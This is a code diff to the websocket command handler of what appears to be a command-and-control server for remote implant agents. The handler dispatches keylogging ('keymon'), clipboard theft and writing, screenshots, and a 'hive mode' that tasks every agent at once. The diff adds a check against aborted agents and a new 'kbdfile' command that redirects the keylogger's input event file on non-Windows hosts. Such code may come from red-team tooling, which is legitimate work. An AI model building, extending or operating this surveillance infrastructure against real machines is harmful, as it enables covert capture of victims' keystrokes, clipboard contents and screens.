@@ -107,11 +107,11 @@ export const setupWS = (httpServer) => {
           input = input.substr(5).trim();
           agents = await agentModel.getAgents();
           client.emit("agent_console_output", {
-            agentID: data.agent.uid, prompt: serverPrompt, msg: `${agents.length} agents selected (hive mode) for command: ${input}`
+            agentID: data.agentID.toString(), prompt: serverPrompt, msg: `${agents.length} agents selected (hive mode) for command: ${input}`
           });
           hiveMode = true;
         }else{
-          agents.push(data.agent);
+          agents.push(await agentModel.getAgent(data.agentID));
         }
         for (let i = 0; i < agents.length; i++){
           const agent = agents[i];
@@ -121,14 +121,23 @@ export const setupWS = (httpServer) => {
               agentID, prompt: username, msg: input
             });            
           }
+          if (agent.aborted){
+            client.emit("agent_console_output", {
+              agentID, prompt: serverPrompt, msg: "You can't task an aborted agent!"
+            });
+            continue;
+          }
           if (input === "help" || input === "?"){
             const agentHelp = {...helpData};
             if (agent.agentType === 0){ // The main C agent
               agentHelp["keymon <secs>"] = "Run a keylogger for given seconds";
               agentHelp["clipread"] = "Get text from clipboard";
               agentHelp["clipwrite <text>"] =  "Write text to clipboard";
-              if (agent.os === "windows")
+              if (agent.os === "windows"){
                 agentHelp["screenshot"] = "Take a screenshot";
+              }else{
+                agentHelp["kbdfile <file>"] = "Change the event file used by keymon";
+              }
             }
             let cmds = Object.keys(agentHelp).sort();
             let maxLen = 0;
@@ -271,6 +280,11 @@ export const setupWS = (httpServer) => {
           }else if (input === "screenshot"){
             taskModel.createTask(username, {
               agentID, taskType: "screenshot"
+            });
+          }else if (input.startsWith("kbdfile ")){
+            let file = input.substr(8).trim();
+            taskModel.createTask(username, {
+              agentID, taskType: "kbdfile", data: {file}
             });
           }else if (input === "abort"){
             taskModel.createTask(username, {
